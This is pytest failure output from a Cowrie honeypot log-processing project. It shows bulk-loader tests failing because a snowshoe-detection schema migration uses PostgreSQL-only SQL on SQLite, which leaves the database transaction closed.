2025-10-18 18:32:08,099:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:08,099:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:08,099:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:08,100:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:08,100:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
___________________ test_bulk_loader_handles_multiline_json ____________________

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_bulk_loader_handles_multi0')

>   ???

/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader.py:136: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader.py:28: in _make_engine
    engine = create_engine_from_settings(settings)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x77567cce0210>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:09,209:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:09,209:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:09,210:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:09,210:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:09,218:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:09,218:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:09,220:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:09,220:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:09,221:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:09,221:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:09,223:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:09,223:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:09,226:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:09,226:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:09,227:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:09,227:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:09,228:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:09,228:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:09,230:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:09,230:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:09,233:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:09,233:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:09,234:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:09,234:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:09,235:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:09,235:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:09,236:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:09,236:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:09,237:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:09,237:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:09,241:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:09,241:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:09,241:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:09,241:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:09,242:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:09,242:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:09,242:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:09,242:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:09,243:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:09,243:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
______________ test_bulk_loader_rejects_multiline_json_by_default ______________

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_bulk_loader_rejects_multi0')

>   ???

/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader.py:164: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/tests/unit/test_bulk_loader.py:28: in _make_engine
    engine = create_engine_from_settings(settings)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b2abe350>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:09,836:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:09,836:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:09,837:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:09,837:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:09,844:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:09,844:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:09,846:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:09,846:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:09,847:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:09,847:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:09,852:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:09,852:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:09,854:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:09,854:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:09,855:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:09,855:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:09,856:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:09,856:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:09,857:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:09,857:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:09,858:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:09,858:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:09,859:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:09,859:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:09,860:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:09,860:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:09,861:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:09,861:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:09,862:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:09,862:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:09,863:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:09,863:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:09,863:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:09,863:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:09,864:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:09,864:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:09,864:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:09,864:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:09,865:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:09,865:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
